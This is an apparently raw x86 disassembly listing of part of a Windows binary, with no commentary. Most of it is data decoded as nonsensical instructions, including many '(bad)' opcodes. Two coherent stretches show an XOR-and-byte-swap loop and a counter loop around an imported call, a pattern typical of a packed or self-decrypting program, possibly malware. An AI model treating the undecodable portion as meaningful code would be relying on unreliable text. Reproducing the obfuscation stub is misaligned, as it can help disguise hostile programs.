  4060e4:	je     0x406135
  4060e6:	add    eax,0x6a265e1f
  4060eb:	inc    ebx
  4060ec:	or     al,0x89
  4060ee:	sbb    DWORD PTR [ebp-0x22],0xffffffc2
  4060f2:	mov    al,0xce
  4060f4:	inc    esi
  4060f5:	out    dx,eax
  4060f6:	aas    
  4060f7:	(bad)  
  4060f8:	pop    ds
  4060f9:	gs cmc 
  4060fb:	stos   BYTE PTR es:[edi],al
  4060fc:	jl     0x40614f
  4060fe:	fs or  al,0x18
  406101:	lock cmp al,0x99
  406104:	add    DWORD PTR [edx+edi*4+0x48],ebp
  406108:	imul   esp,ebp,0x73
  40610b:	cmp    bh,cl
  40610d:	mov    ds:0xcde6f16a,al
  406112:	jnp    0x40614f
  406114:	mov    al,0xc1
  406116:	popa   
  406117:	popf   
  406118:	xor    ebx,ebx
  40611a:	pop    es
  40611b:	mov    edx,0x6ba19f47
  406120:	out    0x23,al
  406122:	test   eax,0x2b5122e6
  406127:	jns    0x406106
  406129:	adc    eax,0x76a5ae2d
  40612e:	daa    
  40612f:	inc    esp
  406130:	and    BYTE PTR [eax+0x3b],0x12
  406134:	jl     0x406103
  406136:	(bad)  
  406137:	rol    DWORD PTR [ebp-0x2a],1
  40613a:	xchg   DWORD PTR [eax+0x78c34df4],ebx
  406140:	xor    eax,0xeb0dc6c3
  406145:	adc    dh,BYTE PTR [ebx]
  406147:	or     al,0x47
  406149:	sbb    eax,0x1d861312
  40614e:	sub    al,0x26
  406150:	sbb    esp,ebp
  406152:	push   es
  406153:	adc    eax,0x8e05099c
  406158:	out    dx,eax
  406159:	mov    ecx,0x8fe0e3e9
  40615e:	add    eax,0xeb8448e5
  406163:	and    BYTE PTR [ebx+0x21b49c41],al
  406169:	and    BYTE PTR [ebx+edx*8],bh
  40616c:	inc    ebx
  40616d:	pop    edx
  40616e:	mov    eax,0x10e62e03
  406173:	(bad)  
  406174:	int    0xa
  406176:	and    eax,0xcfb713f2
  40617b:	sub    BYTE PTR [ebx-0x59d72769],dl
  406181:	push   esi
  406182:	xor    ch,BYTE PTR [ecx+edi*4]
  406185:	aad    0xa3
  406187:	pop    es
  406188:	inc    ebp
  406189:	fdiv   DWORD PTR [edi]
  40618b:	ror    BYTE PTR [edx-0x694c7e37],0x45
  406192:	mov    ebp,0x5c6a7360
  406197:	test   DWORD PTR [edx+0xc],edi
  40619a:	jmp    0xafa7fedd
  40619f:	mov    ebp,ebp
  4061a1:	in     eax,0x91
  4061a3:	loopne 0x40613c
  4061a5:	mov    esp,DWORD PTR [ebp+0x2dda10cc]
  4061ab:	add    al,0x6a
  4061ad:	add    al,BYTE PTR [ebx-0x69]
  4061b0:	sbb    ch,BYTE PTR [ebp+0x6a]
  4061b3:	rol    BYTE PTR [edx-0x5],0xf
  4061b7:	add    BYTE PTR [edx],cl
  4061b9:	mov    ah,0x51
  4061bb:	scas   al,BYTE PTR es:[edi]
  4061bc:	adc    cl,BYTE PTR es:[ebx]
  4061bf:	iret   
  4061c0:	imul   cl
  4061c2:	inc    esp
  4061c3:	pop    ebx
  4061c4:	and    al,0x55
  4061c6:	arpl   WORD PTR [ebx-0x5c9b614f],si
  4061cc:	or     eax,0xb36b4a09
  4061d1:	dec    edi
  4061d2:	sub    DWORD PTR [edi+esi*2-0x70aa4420],edi
  4061d9:	test   BYTE PTR [ebp+0x2966436],0xf3
  4061e0:	call   0xbbaf:0x7ec8784f
  4061e7:	inc    esi
  4061e8:	mov    ds:0x31a62a78,al
  4061ed:	stos   BYTE PTR es:[edi],al
  4061ee:	xor    dh,BYTE PTR [esi+0x11]
  4061f1:	repz mov ds:0xb6ff55ff,al
  4061f7:	sbb    edi,DWORD PTR [ecx-0x14]
  4061fa:	mov    edi,0x7c01d44b
  4061ff:	xchg   ebx,ecx
  406201:	mov    edi,0xb301ba48
  406206:	xchg   ebp,eax
  406207:	leave  
  406208:	sbb    eax,0xbadea231
  40620d:	mov    edi,0x670bbf7f
  406212:	jecxz  0x4061cf
  406214:	loope  0x4061af
  406216:	dec    edx
  406217:	push   esp
  406218:	pop    es
  406219:	div    edi
  40621b:	mov    ebp,0x14bb91c4
  406220:	push   ebx
  406221:	mov    ah,0x7f
  406223:	sbb    dl,BYTE PTR [ebx]
  406225:	mov    cl,0x88
  406227:	daa    
  406228:	mov    BYTE PTR [ecx+0xe4a6969],dl
  40622e:	leave  
  40622f:	cwde   
  406230:	adc    ecx,DWORD PTR [ebx+0x56]
  406233:	sub    al,0x5
  406235:	inc    ecx
  406236:	je     0x4061c4
  406238:	popa   
  406239:	ror    esp,cl
  40623b:	pop    ss
  40623c:	daa    
  40623d:	and    al,0xb
  40623f:	int3   
  406240:	addr16 imul eax,ebp,0xffffffdb
  406244:	inc    ecx
  406245:	fnstenv [edi-0x3a94a4c8]
  40624b:	mov    dh,0x90
  40624d:	or     al,0x7d
  40624f:	jno    0x406248
  406251:	rol    BYTE PTR [esi-0x54398def],1
  406257:	inc    ebp
  406258:	loope  0x40629f
  40625a:	jmp    0xbeab:0x9e65517b
  406261:	pop    edx
  406262:	xchg   ecx,eax
  406263:	push   ecx
  406264:	ins    BYTE PTR es:[edi],dx
  406265:	outs   dx,BYTE PTR ds:[esi]
  406266:	lods   eax,DWORD PTR ds:[esi]
  406267:	test   eax,0xed2e5e47
  40626c:	mov    esp,0x3bc7f1ac
  406271:	sub    eax,ebx
  406273:	dec    ebx
  406274:	outs   dx,DWORD PTR ds:[esi]
  406275:	int    0x4b
  406277:	cmp    DWORD PTR [ebx],edx
  406279:	or     bh,BYTE PTR [ecx]
  40627b:	call   0xe52b:0x4b4d137d
  406282:	enter  0x9e08,0x22
  406286:	pop    esi
  406287:	ficomp DWORD PTR [ecx-0x5bf7a087]
  40628d:	int    0xbf
  40628f:	and    al,0xd1
  406291:	sahf   
  406292:	retf   
  406293:	out    dx,eax
  406294:	fwait
  406295:	xchg   edx,eax
  406296:	(bad)
  40629a:	and    eax,ecx
  40629c:	int    0x14
  40629e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40629f:	xchg   bl,dh
  4062a1:	lahf   
  4062a2:	loop   0x40630d
  4062a4:	push   edi
  4062a5:	fidivr DWORD PTR [edx-0x8335f8d]
  4062ab:	arpl   WORD PTR [ebp+0x6172bc9a],bp
  4062b1:	sbb    ecx,ebx
  4062b3:	jae    0x4062a9
  4062b5:	std    
  4062b6:	mov    ch,0x77
  4062b8:	jecxz  0x406277
  4062ba:	inc    ebp
  4062bb:	push   ebx
  4062bc:	scas   al,BYTE PTR es:[edi]
  4062bd:	pop    edx
  4062be:	dec    edx
  4062bf:	or     ah,BYTE PTR [eax-0x331708fa]
  4062c5:	and    dh,dh
  4062c7:	lahf   
  4062c8:	pop    ebp
  4062c9:	mov    ch,0x5e
  4062cb:	and    al,0x1
  4062cd:	dec    edx
  4062ce:	retf   0xc70a
  4062d1:	and    eax,0x3003ddf0
  4062d6:	mov    ecx,0xe26234bb
  4062db:	xchg   edi,eax
  4062dc:	(bad)  
  4062dd:	out    dx,al
  4062de:	test   al,0x3b
  4062e0:	jg     0x406289
  4062e2:	lahf   
  4062e3:	or     DWORD PTR [edx],edx
  4062e5:	lea    ebp,[eax-0x3bec7cf4]
  4062eb:	lahf   
  4062ec:	in     eax,0x63
  4062ee:	scas   eax,DWORD PTR es:[edi]
  4062ef:	xor    bh,BYTE PTR [edx+0x7cb9aede]
  4062f5:	mov    BYTE PTR [esi-0x2df98b02],0x2e
  4062fc:	jecxz  0x406299
  4062fe:	mov    ds:0x50c12c1f,al
  406303:	dec    eax
  406304:	mov    bl,0x8f
  406306:	ds dec edi
  406308:	or     eax,0x6eadc3ef
  40630d:	jo     0x4062c7
  40630f:	into   
  406310:	cdq    
  406311:	sub    al,0xa2
  406313:	sbb    BYTE PTR [edx-0x78ebc128],ah
  406319:	push   ebx
  40631a:	pop    ds
  40631b:	hlt    
  40631c:	inc    esi
  40631d:	push   esi
  40631e:	mov    edi,0x50fe02b
  406323:	(bad)  
  406324:	scas   al,BYTE PTR es:[edi]
  406325:	xor    DWORD PTR [edx],esp
  406327:	and    BYTE PTR ds:0x4c121c90,ch
  40632d:	icebp  
  40632e:	jnp    0x40631e
  406330:	and    DWORD PTR [edx+0x28],esp
  406333:	popa   
  406334:	aaa    
  406335:	sbb    eax,0xa31e0d59
  40633a:	out    dx,al
  40633b:	dec    eax
  40633c:	hlt    
  40633d:	pop    es
  40633e:	adc    BYTE PTR [ebx],ch
  406340:	sub    DWORD PTR [edi-0x4f],ecx
  406343:	(bad)  
  406344:	mov    bh,0x18
  406346:	sub    BYTE PTR [ecx-0x67],ah
  406349:	imul   esp,DWORD PTR [ebx-0x66],0xabd6e605
  406350:	jge    0x4063b7
  406352:	out    0x80,al
  406354:	(bad)  
  406355:	xor    BYTE PTR [eax-0x2b8d67a4],bh
  40635b:	aas    
  40635c:	cld    
  40635d:	aas    
  40635e:	pop    ds
  40635f:	mov    ebx,edi
  406361:	sbb    eax,0x9cf253a
  406366:	mov    edx,0xddb79311
  40636b:	std    
  40636c:	mov    WORD PTR [ebx-0x652b024e],ss
  406372:	dec    BYTE PTR [ecx-0x1d4b8f67]
  406378:	in     al,dx
  406379:	jle    0x406364
  40637b:	dec    edx
  40637c:	outs   dx,DWORD PTR ds:[esi]
  40637d:	iret   
  40637e:	xchg   esi,eax
  40637f:	push   esi
  406380:	mov    dh,0x7f
  406382:	inc    ebp
  406383:	cmp    DWORD PTR [edi+0x30],edi
  406386:	aaa    
  406387:	stos   DWORD PTR es:[edi],eax
  406388:	sub    al,0xeb
  40638a:	outs   dx,DWORD PTR ds:[esi]
  40638b:	push   cs
  40638c:	int3   
  40638d:	adc    esi,esp
  40638f:	(bad)  
  406390:	clc    
  406391:	aaa    
  406392:	idiv   BYTE PTR [eax+0x535f1fc2]
  406398:	cmc    
  406399:	jge    0x406388
  40639b:	adc    bl,BYTE PTR [ebx]
  40639d:	and    ecx,DWORD PTR [edx]
  40639f:	fcmovne st,st(2)
  4063a1:	jge    0x406325
  4063a3:	imul   eax,DWORD PTR ds:[edi-0x26bd613d],0xffffffbf
  4063ab:	aad    0x5f
  4063ad:	sub    BYTE PTR [edx-0x31],0x7c
  4063b1:	or     al,0x25
  4063b3:	sahf   
  4063b4:	in     eax,0x58
  4063b6:	repnz pop esi
  4063b8:	jp     0x4063ad
  4063ba:	call   esi
  4063bc:	mov    DWORD PTR [esp+ebx*1-0x74c4ec6d],ebp
  4063c3:	out    dx,al
  4063c4:	xlat   BYTE PTR ds:[ebx]
  4063c5:	mov    dh,0x5a
  4063c7:	sbb    ecx,0x93d63170
  4063cd:	pop    ebp
  4063ce:	ror    DWORD PTR [ebp+0xfd29997],1
  4063d4:	xchg   BYTE PTR [ebx],al
  4063d6:	add    BYTE PTR [eax],al
  4063d8:	add    BYTE PTR [ebx+0x7d8bc455],cl
  4063de:	cld    
  4063df:	xor    edi,eax
  4063e1:	xor    edx,eax
  4063e3:	add    edi,ecx
  4063e5:	add    edx,ecx
  4063e7:	imul   edx,edi
  4063ea:	mov    DWORD PTR [ebp+0xc],edx
  4063ed:	mov    edx,DWORD PTR [ebp+0xc]
  4063f0:	mov    DWORD PTR [ebp-0x24],edx
  4063f3:	mov    edx,DWORD PTR [ebp-0x8]
  4063f6:	add    edx,DWORD PTR [ebp-0x40]
  4063f9:	mov    DWORD PTR [ebp-0x18],0xf89c8531
  406400:	mov    DWORD PTR [ebp-0x1c],edx
  406403:	mov    DWORD PTR [ebp-0xc],0xf89c8532
  40640a:	mov    DWORD PTR [ebp-0x44],0xf89c8533
  406411:	mov    edx,DWORD PTR [ebp-0x18]
  406414:	xor    edx,eax
  406416:	add    edx,ecx
  406418:	jmp    0x4067df
  40641d:	mov    edx,DWORD PTR [ebp-0x18]
  406420:	xor    edx,eax
  406422:	add    edx,DWORD PTR [ebp-0x14]
  406425:	mov    edi,DWORD PTR [ebp-0x1c]
  406428:	mov    dl,BYTE PTR [edx+edi*1+0x32729b]
  40642f:	mov    BYTE PTR [ebp+0xf],dl
  406432:	mov    edx,DWORD PTR [ebp-0xc]
  406435:	xor    edx,eax
  406437:	add    edx,DWORD PTR [ebp-0x14]
  40643a:	mov    edi,DWORD PTR [ebp-0x1c]
  40643d:	mov    dl,BYTE PTR [edx+edi*1+0x32729b]
  406444:	mov    BYTE PTR [ebp+0xb],dl
  406447:	mov    dl,BYTE PTR [ebp+0xf]
  40644a:	mov    edi,DWORD PTR [ebp-0xc]
  40644d:	jmp    0x4067a7
  406452:	pop    esi
  406453:	xlat   BYTE PTR ds:[ebx]
  406454:	pop    edi
  406455:	jmp    0x4064ce
  406457:	jae    0x4064c3
  406459:	push   ebx
  40645a:	jmp    0x4064aa
  40645c:	cmc    
  40645d:	pop    ss
  40645e:	mov    WORD PTR ds:0x38a5fc2a,cs
  406464:	jle    0x4064e4
  406466:	xor    edi,DWORD PTR [ebp+0x7e]
  406469:	jle    0x4064c5
  40646b:	push   ebp
  40646c:	pop    eax
  40646d:	xor    DWORD PTR [esp+edx*8-0x3b98b941],esi
  406474:	jge    0x4064d8
  406476:	inc    esi
  406477:	(bad)  
  406478:	loop   0x4064cc
  40647a:	mov    dl,0x5
  40647c:	and    esi,DWORD PTR [ecx+0x4c241024]
  406482:	mov    ebp,?
  406484:	mov    BYTE PTR [ebx],dh
  406486:	mov    ss,WORD PTR [ebx-0x6a4be0a5]
  40648c:	inc    edx
  40648d:	mov    edx,0xe02d8752
  406492:	cdq    
  406493:	push   ds
  406494:	gs repnz mov dh,0x18
  406498:	in     al,0x69
  40649a:	addr16 pop ss
  40649c:	xor    DWORD PTR [eax+esi*1],edx
  40649f:	xor    eax,0xca49efb6
  4064a4:	leave  
  4064a5:	mov    bh,0x1c
  4064a7:	sub    ch,ah
  4064a9:	ret    
  4064aa:	mov    bh,0x89
  4064ac:	clc    
  4064ad:	cmp    ch,BYTE PTR [edx+esi*1-0x7c4d8a20]
  4064b4:	cmp    cl,bh
  4064b6:	mov    eax,ds:0xed46ef4e
  4064bb:	xor    cl,ah
  4064bd:	push   cs
  4064be:	jmp    0xc81c726d
  4064c3:	mov    esp,0x64294454
  4064c8:	jnp    0x4064f6
  4064ca:	xchg   ecx,eax
  4064cb:	arpl   WORD PTR ds:0xd4bd442c,bp
  4064d1:	outs   dx,DWORD PTR ds:[esi]
  4064d2:	dec    edi
  4064d3:	jg     0x4064a9
  4064d5:	outs   dx,DWORD PTR ds:[esi]
  4064d6:	cmp    eax,0xb3f55dd9
  4064db:	mov    esi,DWORD PTR ds:0xb3da63d0
  4064e1:	stc    
  4064e2:	add    edx,DWORD PTR [edx+ecx*4+0xf]
  4064e6:	out    0xd4,eax
  4064e8:	les    esi,FWORD PTR [edx+0x73]
  4064eb:	stos   DWORD PTR es:[edi],eax
  4064ec:	jae    0x406521
  4064ee:	not    DWORD PTR [esi+ebp*4-0x7b]
  4064f2:	xchg   ebp,eax
  4064f3:	js     0x406567
  4064f5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4064f6:	outs   dx,DWORD PTR ds:[esi]
  4064f7:	and    dh,BYTE PTR [esi+edx*8]
  4064fa:	or     al,0xbc
  4064fc:	jo     0x406539
  4064fe:	cmp    bh,BYTE PTR ds:0x10ce3abd
  406504:	stos   BYTE PTR es:[edi],al
  406505:	or     DWORD PTR [edi+0x14b14e58],0x77bfb911
  40650f:	xchg   esp,ebx
  406511:	mov    al,0x6c
  406513:	xchg   ecx,eax
  406514:	adc    eax,0xafccdeb6
  406519:	adc    ebp,DWORD PTR [ecx-0x13]
  40651c:	dec    esp
  40651d:	cmp    DWORD PTR [ecx+ebx*8-0x452fc328],0xffffffe0
  406525:	cmp    eax,0xd3aaa787
  40652a:	cli    
  40652b:	cmc    
  40652c:	push   ecx
  40652d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40652e:	push   eax
  40652f:	adc    al,BYTE PTR [ecx-0x1b18ab82]
  406535:	fmul   QWORD PTR [edx]
  406537:	sbb    eax,0x86b0776e
  40653c:	outs   dx,BYTE PTR ds:[esi]
  40653d:	cwde   
  40653e:	(bad)  
  40653f:	aas    
  406540:	adc    eax,0x3a3c2b84
  406545:	inc    ebp
  406546:	mov    ?,WORD PTR [edi]
  406548:	inc    eax
  406549:	dec    ecx
  40654a:	pop    eax
  40654b:	xchg   ebx,eax
  40654c:	icebp  
  40654d:	popa   
  40654e:	cmp    ch,BYTE PTR [esi-0x6d]
  406551:	outs   dx,BYTE PTR ds:[esi]
  406552:	push   cs
  406553:	xchg   ebp,eax
  406554:	add    esi,DWORD PTR [ecx+0x25280973]
  40655a:	cmc    
  40655b:	icebp  
  40655c:	fistp  DWORD PTR [esi+0x356d215a]
  406562:	sub    al,0xe6
  406564:	inc    eax
  406565:	sub    ebx,ebx
  406567:	mov    cl,0xfe
  406569:	mov    esp,0x8bd11177
  40656e:	xchg   esp,eax
  40656f:	cmp    ah,BYTE PTR [edi-0x66413b5a]
  406575:	push   edi
  406577:	pop    edi
  406578:	dec    esp
  406579:	or     DWORD PTR [edx-0x517bfaf6],eax
  40657f:	or     dh,dh
  406581:	mov    al,ds:0xeb431c76
  406586:	xchg   ebx,eax
  406587:	ja     0x40657a
  406589:	pusha  
  40658a:	outs   dx,BYTE PTR ds:[esi]
  40658b:	xchg   ebp,eax
  40658c:	sti    
  40658d:	mov    ecx,0x99ac234f
  406592:	push   ds
  406593:	ins    BYTE PTR es:[edi],dx
  406594:	lods   al,BYTE PTR ds:[esi]
  406595:	and    eax,0x65d3710d
  40659a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40659b:	cmp    al,0x63
  40659d:	and    eax,0x4af0e770
  4065a2:	mov    cl,0x29
  4065a4:	jb     0x406616
  4065a6:	mov    ah,0x32
  4065a8:	retf   0xa94b
  4065ab:	imul   ebx,DWORD PTR [ecx+0x64],0xffffffee
  4065af:	(bad)  
  4065b0:	lea    edi,[eax-0x1d385dfb]
  4065b6:	fsub   DWORD PTR [ebx-0x41a13c7f]
  4065bc:	inc    esi
  4065bd:	dec    ebp
  4065be:	aaa    
  4065bf:	xor    edi,DWORD PTR [esi]
  4065c1:	ficom  WORD PTR [ebp+0x76]
  4065c4:	cmp    al,0x43
  4065c6:	jmp    0x209079f0
  4065cb:	mov    bh,0xd3
  4065cd:	mov    edx,0xe0e77353
  4065d2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4065d3:	pop    ebx
  4065d4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4065d5:	mov    al,ds:0x22fe76d2
  4065da:	pop    esp
  4065db:	jmp    0x9de68b2e
  4065e0:	jae    0x406599
  4065e2:	int    0x28
  4065e4:	js     0x4065fe
  4065e6:	test   eax,0x1b7ffe3f
  4065eb:	jle    0x40662c
  4065ed:	add    DWORD PTR [ebx-0x5bc2a61d],edx
  4065f3:	int3   
  4065f4:	lahf   
  4065f5:	xor    al,0xc6
  4065f7:	push   ebp
  4065f8:	pop    ds
  4065f9:	mov    al,0xf8
  4065fb:	stos   DWORD PTR es:[edi],eax
  4065fc:	and    BYTE PTR [esi],dh
  4065fe:	mov    cl,0x4c
  406600:	inc    edi
  406601:	push   edi
  406602:	xchg   edx,eax
  406603:	push   cs
  406604:	jp     0x40666a
  406606:	inc    ebx
  406607:	and    al,0xc1
  406609:	jge    0x4065c2
  40660b:	int3   
  40660c:	js     0x40665e
  40660e:	dec    edx
  40660f:	xor    esp,DWORD PTR [edx+eax*4+0x3211ba00]
  406616:	das    
  406617:	xchg   DWORD PTR ds:0xecb332da,eax
  40661d:	cdq    
  40661e:	push   eax
  40661f:	inc    ecx
  406620:	daa    
  406621:	add    DWORD PTR [esi],edx
  406623:	or     dl,al
  406625:	cmc    
  406626:	loop   0x4066a1
  406628:	mov    dl,0x6e
  40662a:	cmp    esp,DWORD PTR [eax+0x44]
  40662d:	xchg   edx,eax
  40662e:	dec    ebx
  40662f:	std    
  406630:	aaa    
  406631:	push   edi
  406632:	jg     0x40663e
  406634:	mov    ch,0xc7
  406636:	jns    0x406624
  406638:	adc    DWORD PTR [ebx-0x572795b4],ebp
  40663e:	mov    WORD PTR [ecx+eiz*1-0x4febedbb],ss
  406645:	mov    bl,0x23
  406647:	sub    al,0xc
  406649:	jge    0x40667d
  40664b:	push   es
  40664c:	adc    eax,0xa88f20fd
  406651:	fwait
  406652:	add    eax,0xe59abe19
  406657:	cmp    esi,edx
  406659:	popa   
  40665a:	ret    
  40665b:	xchg   edx,eax
  40665c:	std    
  40665d:	adc    al,0xc1
  40665f:	jg     0x406622
  406661:	xchg   DWORD PTR [edi+ebp*8],ebx
  406664:	add    BYTE PTR [ebp+edi*1-0x56],ah
  406668:	push   ecx
  406669:	aaa    
  40666a:	mov    BYTE PTR [ebx],0x3d
  40666d:	cmp    DWORD PTR [esp+ebp*2+0x77],ebp
  406671:	adc    al,0xf3
  406673:	pop    es
  406674:	dec    DWORD PTR [edi+0xd6c3a26]
  40667a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40667b:	pop    ss
  40667c:	inc    ebp
  40667d:	xor    bl,dl
  40667f:	fcom   QWORD PTR [ecx-0x7f]
  406682:	in     al,0x83
  406684:	xchg   BYTE PTR [ebx],cl
  406686:	pushf  
  406687:	pop    ebx
  406688:	push   ecx
  406689:	inc    ebp
  40668a:	not    BYTE PTR ds:0x366583a6
  406690:	jno    0x406679
  406692:	push   edi
  406693:	add    al,bh
  406695:	cmp    BYTE PTR [ebx+esi*4],bh
  406698:	or     eax,0xe47fa724
  40669d:	sbb    BYTE PTR [edi+0x7b157f6],dl
  4066a3:	xor    al,0x5
  4066a5:	arpl   WORD PTR [esi],sp
  4066a7:	dec    ebx
  4066a8:	in     eax,0x11
  4066aa:	jge    0x406727
  4066ac:	out    dx,eax
  4066ad:	rcr    DWORD PTR [ebx-0x38],1
  4066b0:	test   al,0xa1
  4066b2:	push   0xffffffa7
  4066b4:	pusha  
  4066b5:	or     al,0x4e
  4066b7:	pop    ecx
  4066b8:	mov    eax,0xe9273776
  4066bd:	rol    DWORD PTR [edi+esi*2-0x71a8353],0x64
  4066c5:	lds    esi,FWORD PTR [edx-0x40]
  4066c8:	and    al,0x56
  4066ca:	imul   BYTE PTR [eax+0x6]
  4066cd:	(bad)  
  4066ce:	xchg   edi,eax
  4066cf:	sbb    al,0x62
  4066d1:	dec    eax
  4066d2:	pusha  
  4066d3:	retf   
  4066d4:	push   cs
  4066d5:	mov    ch,0x7
  4066d7:	inc    edi
  4066d8:	iret   
  4066d9:	jnp    0x406735
  4066db:	call   0x2835688
  4066e0:	adc    DWORD PTR [ecx-0x5abeabf1],0xe05e8865
  4066ea:	jnp    0x4066b1
  4066ec:	jbe    0x4066d0
  4066ee:	gs pop edi
  4066f0:	mov    bh,0x2
  4066f2:	aad    0x71
  4066f4:	enter  0x1a4d,0xe4
  4066f8:	mov    eax,0xcba95c26
  4066fd:	addr16 in al,0x7e
  406700:	xor    eax,0x829e417b
  406705:	stc    
  406706:	jmp    0x406757
  406708:	xor    eax,0xcaa049c1
  40670d:	ds xchg esp,eax
  40670f:	xchg   edi,eax
  406710:	es popa 
  406712:	jg     0x40678a
  406714:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406715:	vpmulhuw ymm0,ymm5,YMMWORD PTR [edi-0x48ea7368]
  40671d:	sbb    bh,bl
  40671f:	fucomp st(4)
  406721:	add    DWORD PTR [esi+esi*8],eax
  406724:	inc    esp
  406725:	fst    QWORD PTR [edx]
  406727:	shr    BYTE PTR [ebx+0x64b40c0a],0xc4
  40672e:	sub    DWORD PTR [esi],esi
  406730:	adc    eax,0xe20bb2f6
  406735:	mov    cl,0xb0
  406737:	cld    
  406738:	aad    0xf9
  40673a:	int    0xda
  40673c:	mov    al,0x3c
  40673e:	imul   edx,ebp,0x1a
  406741:	loope  0x406771
  406743:	lds    eax,FWORD PTR ds:[edi]
  406746:	push   es
  406747:	pop    ebx
  406748:	int3   
  406749:	test   eax,0x152adad9
  40674e:	mov    al,ds:0x936906b8
  406753:	xor    eax,eax
  406755:	pop    eax
  406756:	outs   dx,BYTE PTR ds:[esi]
  406757:	push   0x60e13a18
  40675c:	adc    al,BYTE PTR [ecx+0x5a]
  40675f:	into   
  406760:	xchg   ebx,eax
  406761:	xor    al,0x1e
  406763:	ins    BYTE PTR es:[edi],dx
  406764:	add    DWORD PTR [ebx+0x49d3cb9a],edi
  40676a:	jl     0x4067c3
  40676c:	jbe    0x4067e9
  40676e:	je     0x40673e
  406770:	jb     0x40672f
  406772:	(bad)  
  406773:	xchg   ebp,eax
  406774:	xor    al,0x22
  406776:	lds    esp,FWORD PTR [eax-0x67]
  406779:	fsubr  QWORD PTR [esi]
  40677b:	or     DWORD PTR [ebp+0x46],0x5b
  40677f:	inc    ecx
  406780:	mov    ch,0xfa
  406782:	int    0xe4
  406784:	mov    esi,0x1e499dfc
  406789:	or     eax,0xb7aff32a
  40678e:	or     ebp,ecx
  406790:	aad    0xac
  406792:	inc    esi
  406793:	add    ch,ch
  406795:	jge    0x40676a
  406797:	jne    0x40677c
  406799:	out    0xee,al
  40679b:	add    ah,BYTE PTR ds:0xd352981b
  4067a1:	xchg   edi,eax
  4067a2:	jb     0x4067c4
  4067a4:	jmp    0x40674a
  4067a6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4067a7:	xor    edi,eax
  4067a9:	add    edi,DWORD PTR [ebp-0x14]
  4067ac:	mov    ebx,DWORD PTR [ebp-0x1c]
  4067af:	mov    BYTE PTR [edi+ebx*1+0x32729b],dl
  4067b6:	mov    dl,BYTE PTR [ebp+0xb]
  4067b9:	mov    edi,DWORD PTR [ebp-0x18]
  4067bc:	xor    edi,eax
  4067be:	add    edi,DWORD PTR [ebp-0x14]
  4067c1:	mov    ebx,DWORD PTR [ebp-0x1c]
  4067c4:	mov    BYTE PTR [edi+ebx*1+0x32729b],dl
  4067cb:	mov    edx,DWORD PTR [ebp-0x44]
  4067ce:	mov    edi,DWORD PTR [ebp-0xc]
  4067d1:	xor    edx,eax
  4067d3:	xor    edi,eax
  4067d5:	add    edx,ecx
  4067d7:	add    edi,ecx
  4067d9:	imul   edx,edi
  4067dc:	add    edx,DWORD PTR [ebp-0x14]
  4067df:	mov    DWORD PTR [ebp-0x14],edx
  4067e2:	mov    edx,DWORD PTR [ebp-0xc]
  4067e5:	mov    edi,DWORD PTR [ebp-0x24]
  4067e8:	xor    edx,eax
  4067ea:	add    edx,ecx
  4067ec:	imul   edx,edi
  4067ef:	mov    edi,DWORD PTR [ebp-0xc]
  4067f2:	xor    edi,eax
  4067f4:	sub    edx,edi
  4067f6:	mov    edi,DWORD PTR [ebp-0xc]
  4067f9:	mov    ebx,DWORD PTR [ebp-0x14]
  4067fc:	xor    edi,eax
  4067fe:	add    edi,ecx
  406800:	imul   edi,ebx
  406803:	mov    ebx,DWORD PTR [ebp-0x18]
  406806:	xor    ebx,eax
  406808:	sub    edx,ecx
  40680a:	lea    edi,[edi+ebx*1+0x32729b]
  406811:	cmp    edi,edx
  406813:	jbe    0x40641d
  406819:	mov    edx,DWORD PTR [ebp-0xc]
  40681c:	mov    edi,DWORD PTR [ebp-0x24]
  40681f:	xor    edx,eax
  406821:	add    edx,ecx
  406823:	imul   edx,edi
  406826:	mov    edi,DWORD PTR [ebp-0x18]
  406829:	xor    edi,eax
  40682b:	add    edx,edi
  40682d:	mov    edi,DWORD PTR [ebp-0x8]
  406830:	lea    edx,[edx+edi*1+0x32729b]
  406837:	mov    DWORD PTR [ebp-0x8],edx
  40683a:	mov    edx,DWORD PTR [ebp-0x20]
  40683d:	xor    edx,eax
  40683f:	mov    edi,0xffcd8d65
  406844:	sub    edi,edx
  406846:	add    edi,DWORD PTR [ebp-0x10]
  406849:	mov    edx,DWORD PTR [ebp-0x20]
  40684c:	mov    ebx,DWORD PTR [ebp-0x8]
  40684f:	xor    edx,eax
  406851:	add    edx,ecx
  406853:	imul   edx,ebx
  406856:	cmp    edx,edi
  406858:	jbe    0x40501f
  40685e:	pop    ebx
  40685f:	pop    edi
  406860:	leave  
  406861:	ret    0x8
  406864:	push   ebp
  406865:	mov    ebp,esp
  406867:	push   ecx
  406868:	mov    ecx,DWORD PTR ds:0x433747
  40686e:	mov    eax,ds:0x43375f
  406873:	sub    ecx,eax
  406875:	xor    ecx,DWORD PTR [ecx+eax*1]
  406878:	mov    ecx,DWORD PTR [ebp+0x8]
  40687b:	and    DWORD PTR ds:0x43366b,0x0
  406885:	jmp    0x406895
  40688a:	mov    eax,ds:0x43366b
  40688f:	inc    eax
  406890:	mov    ds:0x43366b,eax
  406895:	cmp    DWORD PTR ds:0x43366b,0x1d
  40689c:	jae    0x4068e6
  4068a2:	cmp    DWORD PTR ds:0x43366b,0xb
  4068a9:	jne    0x4068c9
  4068af:	push   0x8428
  4068b4:	push   0x433810
  4068b9:	push   0x433810
  4068be:	push   0x433767
  4068c3:	call   DWORD PTR ds:0x412378
  4068c9:	cmp    DWORD PTR ds:0x43366b,0xa
  4068d0:	jne    0x4068e1
  4068d6:	mov    eax,ds:0x43366b
  4068db:	inc    eax
  4068dc:	mov    ds:0x43366b,eax
  4068e1:	jmp    0x40688a
  4068e6:	mov    eax,0x7510854
  4068eb:	sbb    DWORD PTR ds:0x4336fb,0x433673
  4068f5:	xor    ecx,eax
  4068f7:	and    DWORD PTR ds:0x43372f,0x491f
  406901:	add    ecx,0x32729b
  406907:	mov    DWORD PTR ds:0x43361f,0x6297
  406911:	mov    DWORD PTR [ebp+0x10],ecx
  406914:	mov    DWORD PTR [ebp+0x8],0xf34cebd
  40691b:	mov    ecx,0x4881
